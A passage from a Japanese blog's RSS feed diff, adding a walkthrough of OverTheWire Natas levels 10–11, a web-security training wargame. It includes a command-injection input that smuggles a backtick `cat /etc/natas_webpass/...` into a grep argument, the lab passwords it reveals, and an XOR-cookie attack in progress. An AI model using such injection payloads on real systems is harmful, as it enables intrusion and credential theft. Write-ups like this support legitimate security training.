@@ -6,7 +6,316 @@
         <description>Recent content on ただくんぶろぐ</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>ja</language>
-        <lastBuildDate>Mon, 05 Jul 2021 21:06:51 +0900</lastBuildDate><atom:link href="https://tadakun8.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Tue, 06 Jul 2021 20:44:23 +0900</lastBuildDate><atom:link href="https://tadakun8.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>【OverTheWire奮闘記】Natas: Level10〜11</title>
+        <link>https://tadakun8.github.io/post/over-the-wire/natas/level10-11/</link>
+        <pubDate>Tue, 06 Jul 2021 20:44:23 +0900</pubDate>
+        
+        <guid>https://tadakun8.github.io/post/over-the-wire/natas/level10-11/</guid>
+        <description>&lt;h2 id=&#34;level-10&#34;&gt;Level 10&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Username: natas10&lt;br&gt;
+URL: &lt;a href=&#34;http://natas10.natas.labs.overthewire.org&#34;&gt;http://natas10.natas.labs.overthewire.org&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;figure style=&#34;flex-grow: 193; flex-basis: 465px&#34;&gt;
+		&lt;a href=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level10-11/level10/q.png&#34; data-size=&#34;2560x1320&#34;&gt;&lt;img src=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level10-11/level10/q.png&#34;
+				srcset=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level10-11/level10/q_huc3de3c09b353bba82738ee10424f7bb6_618742_480x0_resize_box_2.png 480w, https://tadakun8.github.io/post/over-the-wire/natas/level10-11/level10/q_huc3de3c09b353bba82738ee10424f7bb6_618742_1024x0_resize_box_2.png 1024w&#34;
+				width=&#34;2560&#34;
+				height=&#34;1320&#34;
+				loading=&#34;lazy&#34;
+				alt=&#34;Question&#34;&gt;
+		&lt;/a&gt;
+		
+		&lt;figcaption&gt;Question&lt;/figcaption&gt;
+		
+	&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;answer&#34;&gt;Answer&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;answerまでにやったこと&#34;&gt;Answerまでにやったこと&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;View sourcecode&lt;/code&gt;を押すと&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?
+$key = &amp;quot;&amp;quot;;
+
+if(array_key_exists(&amp;quot;needle&amp;quot;, $_REQUEST)) {
+    $key = $_REQUEST[&amp;quot;needle&amp;quot;];
+}
+
+if($key != &amp;quot;&amp;quot;) {
+    if(preg_match(&#39;/[;|&amp;amp;]/&#39;,$key)) {
+        print &amp;quot;Input contains an illegal character!&amp;quot;;
+    } else {
+        passthru(&amp;quot;grep -i $key dictionary.txt&amp;quot;);
+    }
+}
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;preg_match&lt;/code&gt;関数は引数の正規表現にマッチしたらtrueを返すのでこの中で使われている記号を使わずに&lt;code&gt;cat /etc/natas_webpass/natas11&lt;/code&gt;をしなくてはなりません。&lt;/p&gt;
+&lt;p&gt;ちなみに&lt;code&gt;/[;|&amp;amp;]/&lt;/code&gt;は[]の中身のどれか一つでも含まれていればマッチとみなされます。そのためコマンド連結は使えません。&lt;/p&gt;
+&lt;p&gt;上記の記号以外でコマンド連結ができないか調べましたができなそうです。なので焦点を&lt;code&gt;grep&lt;/code&gt;に絞ってみました。&lt;code&gt;man grep&lt;/code&gt;すると、grepしたいファイルは複数指定できることに気づきました。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/etc/natas_webpass/natas11&lt;/code&gt;の中身で&lt;code&gt;/etc/natas_webpass/natas11&lt;/code&gt;をgrepすればいいのではないかとひらめきました。&lt;/p&gt;
+&lt;p&gt;・・・何を言っているかわからないとは思いますが、入力値は以下です。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;`cat /etc/natas_webpass/natas11` /etc/natas_webpass/natas11
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;こう打つとgrepのコマンドは以下のようになります&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;grep -i `cat /etc/natas_webpass/natas11` /etc/natas_webpass/natas11 dictionary.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;cat /etc/natas_webpass/natas11&lt;/code&gt;の結果、つまりnatas11のパスワードで/etc/natas_webpass/natas11とdictionary.txtにgrepをかけているということに変換できます。&lt;/p&gt;
+&lt;p&gt;&lt;figure style=&#34;flex-grow: 192; flex-basis: 462px&#34;&gt;
+		&lt;a href=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level10-11/level10/a.png&#34; data-size=&#34;2558x1326&#34;&gt;&lt;img src=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level10-11/level10/a.png&#34;
+				srcset=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level10-11/level10/a_hu03c3fcb7a25ec96298a7117d5bb3e5d1_671699_480x0_resize_box_2.png 480w, https://tadakun8.github.io/post/over-the-wire/natas/level10-11/level10/a_hu03c3fcb7a25ec96298a7117d5bb3e5d1_671699_1024x0_resize_box_2.png 1024w&#34;
+				width=&#34;2558&#34;
+				height=&#34;1326&#34;
+				loading=&#34;lazy&#34;
+				alt=&#34;入力後&#34;&gt;
+		&lt;/a&gt;
+		
+		&lt;figcaption&gt;入力後&lt;/figcaption&gt;
+		
+	&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;level-11&#34;&gt;Level 11&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Username: natas11&lt;br&gt;
+URL: &lt;a href=&#34;http://natas11.natas.labs.overthewire.org&#34;&gt;http://natas11.natas.labs.overthewire.org&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;figure style=&#34;flex-grow: 211; flex-basis: 506px&#34;&gt;
+		&lt;a href=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level10-11/level11/q.png&#34; data-size=&#34;2560x1212&#34;&gt;&lt;img src=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level10-11/level11/q.png&#34;
+				srcset=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level10-11/level11/q_hu075815a10416c6bbcce28688992b09c5_760265_480x0_resize_box_2.png 480w, https://tadakun8.github.io/post/over-the-wire/natas/level10-11/level11/q_hu075815a10416c6bbcce28688992b09c5_760265_1024x0_resize_box_2.png 1024w&#34;
+				width=&#34;2560&#34;
+				height=&#34;1212&#34;
+				loading=&#34;lazy&#34;
+				alt=&#34;Question&#34;&gt;
+		&lt;/a&gt;
+		
+		&lt;figcaption&gt;Question&lt;/figcaption&gt;
+		
+	&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;answer-1&#34;&gt;Answer&lt;/h3&gt;
+&lt;h3 id=&#34;answerまでにやったこと-1&#34;&gt;Answerまでにやったこと&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;View sourcecode&lt;/code&gt;を押すと・・・今回は色々と関数が定義されていますね。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;
+
+&lt;span class=&#34;nv&#34;&gt;$defaultdata&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;showpassword&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;no&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;bgcolor&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#ffffff&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;xor_encrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$in&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;censored&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$text&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$in&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$outText&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+    &lt;span class=&#34;c1&#34;&gt;// Iterate through each character
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$outText&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)];&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$outText&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;loadData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$def&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$mydata&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$def&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;array_key_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;data&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$tempdata&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;json_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;xor_encrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;base64_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;data&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])),&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$tempdata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;array_key_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;showpassword&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$tempdata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;array_key_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;bgcolor&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$tempdata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/^#(?:[a-f\d]{6})$/i&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$tempdata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+        &lt;span class=&#34;nv&#34;&gt;$mydata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;showpassword&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$tempdata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;showpassword&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+        &lt;span class=&#34;nv&#34;&gt;$mydata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$tempdata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$mydata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;saveData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nx&#34;&gt;setcookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;data&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;base64_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;xor_encrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;json_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))));&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;loadData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$defaultdata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;array_key_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;bgcolor&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/^#(?:[a-f\d]{6})$/i&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+        &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;nx&#34;&gt;saveData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+
+
+
+&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;lt;h1&amp;gt;natas11&amp;lt;/h1&amp;gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;lt;div id=&amp;#34;content&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;lt;body style=&amp;#34;background: &amp;lt;?=$data[&amp;#39;bgcolor&amp;#39;]?&amp;gt;;&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;Cookies are protected with XOR encryption&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;lt;?
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;if($data[&amp;#34;showpassword&amp;#34;] == &amp;#34;yes&amp;#34;) {
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;    print &amp;#34;The password for natas12 is &amp;lt;censored&amp;gt;&amp;lt;br&amp;gt;&amp;#34;;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;}
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;?&amp;gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;lt;form&amp;gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;Background color: &amp;lt;input name=bgcolor value=&amp;#34;&amp;lt;?=$data[&amp;#39;bgcolor&amp;#39;]?&amp;gt;&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;lt;input type=submit value=&amp;#34;Set color&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;lt;/form&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;コードを見て以下のことを整理しました&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;$data[&amp;quot;showpassword&amp;quot;]&lt;/code&gt;が&lt;code&gt;yes&lt;/code&gt;の時にパスワードが表示される&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;$data[&amp;quot;showpassword&amp;quot;]&lt;/code&gt;は&lt;code&gt;loadData&lt;/code&gt;関数で&lt;code&gt;$tempdata[&#39;showpassword&#39;]&lt;/code&gt;の値が代入されている&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;$tempdata&lt;/code&gt;はCookieのdataという値をこねこねしている
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[&amp;quot;data&amp;quot;])), true)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Cookieは&lt;code&gt;saveData&lt;/code&gt;で保存されていることがわかるので、Cookieの値を取り出してみます。curlでは&lt;code&gt;-c&lt;/code&gt;コマンドの次にパスを指定するとそのファイルにcookie情報が保存されます。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ curl -c cookie.txt -u natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK  http://natas11.natas.labs.overthewire.org
+・
+・
+・
+$ cat cookie.txt
+# Netscape HTTP Cookie File
+# https://curl.haxx.se/docs/http-cookies.html
+# This file was generated by libcurl! Edit at your own risk.
+
+natas11.natas.labs.overthewire.org      FALSE   /       FALSE   0       data    ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;cookie.txtはタブ区切りになっています。どのような情報がタブ区切りになっているかは次のサイトで確認できます。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://curl.se/mail/archive-2005-03/0099.html&#34;&gt;https://curl.se/mail/archive-2005-03/0099.html&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;データは&lt;code&gt;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D&lt;/code&gt;のようです。&lt;/p&gt;
+&lt;p&gt;次にこの値を&lt;code&gt;xor_encrypt&lt;/code&gt;とは逆のことをしたかったのですが、xor_encryptで定義されている&lt;code&gt;$key&lt;/code&gt;の値がわからなかったので途方に暮れました。&lt;/p&gt;
+&lt;p&gt;natasに入って初めてですが、回答を見たいと思います。&lt;/p&gt;
+&lt;h4 id=&#34;回答&#34;&gt;回答&lt;/h4&gt;
+&lt;p&gt;次のサイトを参考にしました&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.data-blogger.com/2018/02/23/my-approach-to-natas-level-11-a-web-security-game/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;My Approach to Natas Level 11 (a Web Security Game)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.abatchy.com/2016/11/natas-level-11&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;OverTheWire: Natas 11&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;xorの性質として以下のことが成り立ちます&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;plaintext XOR key = cyphertext&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;plaintext XOR cyphertext = key&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;keyを求めるために以下のphpコマンドを打ちました。回答に従って、phpのインタラクティブシェルを&lt;code&gt;php -a&lt;/code&gt;で起動して実行します&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// Just the same XOR encrypt code as found in the script but using $key as an argument so we can modify that
